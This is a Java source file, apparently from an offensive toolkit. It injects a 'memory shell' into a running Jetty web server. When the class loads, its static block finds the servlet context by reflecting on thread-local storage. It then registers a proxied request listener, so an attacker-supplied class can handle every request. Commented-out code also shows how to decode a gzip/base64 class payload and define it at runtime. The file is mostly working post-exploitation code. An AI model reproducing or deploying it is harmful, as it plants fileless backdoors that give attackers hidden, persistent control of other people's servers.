package org.example.jetty.memshell;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
public class JettyListenerThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME = "org.example.jetty.memshell.ListenerExec";

    public JettyListenerThreadLoader() {
    }

    static {
        try {
            // 获取 servletContext
            Object servletContext = getServletContext();

            inject(servletContext);

        } catch (Throwable e) {

        }
    }


//    public static void inject(Object standardContext) throws Exception {
//    }

    /**
     * Jetty Listener
     */
    public static void inject(Object servletContext) throws Exception {
        Object[] _eventListeners = (Object[]) getFieldValue(servletContext, "_eventListeners");
        if (_eventListeners != null) {
            for (int i = 0; i < _eventListeners.length; i++) {
                if (_eventListeners[i].getClass().getName().contains(CLASSNAME)) {
                    return;
                }
            }
        }


        // 动态代理兼容 javax jakarta
        Class listenerClass = null;
        try {
            listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
        } catch (Exception e) {
            try {
                listenerClass = Class.forName("javax.servlet.ServletRequestListener");
            } catch (ClassNotFoundException ex) {

            }
        }

//        byte[] bytes = decompress(gzipObject);
//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//        defineClass.setAccessible(true);
//        Class clazz;
//        try {
//            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
//        } catch (Exception e) {
//            clazz = classLoader.loadClass(CLASSNAME);
//        }

        Class clazz = Class.forName(CLASSNAME);
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);


        invokeMethod(servletContext.getClass().getSuperclass(), servletContext, "addEventListener", new Class[]{Class.forName("java.util.EventListener")}, new Object[]{object});


    }

    public static Object getServletContext() throws Exception {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");
            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

//                ServletContextHandler.getCurrentContext()
                Object context = invokeMethod(Class.forName("org.eclipse.jetty.server.handler.ContextHandler"), value, "getCurrentContext", new Class[]{}, new Object[]{});
                Object servletContext = getFieldValue(context, "this$0");

                return servletContext;

                // todo 测试版本覆盖 以下为 rceecho 相关类
                // Jetty 7 低版本 org.eclipse.jetty.server.nio.SelectChannelConnector
                // Jetty 7 8  org.eclipse.jetty.server.AsyncHttpConnection
                // Jetty 9、10  org.eclipse.jetty.server.HttpConnection
            }
        } catch (Exception e) {

        }


        return null;
    }

    public static Object getObject() throws Exception {
        // 动态代理兼容 javax jakarta
        Class listenerClass = null;
        try {
            listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
        } catch (Exception e) {
            try {
                listenerClass = Class.forName("javax.servlet.ServletRequestListener");
            } catch (ClassNotFoundException ex) {

            }
        }

//        byte[] bytes = decompress(gzipObject);
//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//        defineClass.setAccessible(true);
//        Class clazz;
//        try {
//            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
//        } catch (Exception e) {
//            clazz = classLoader.loadClass(CLASSNAME);
//        }

        Class clazz = Class.forName(CLASSNAME);
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);

        return object;
    }


    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
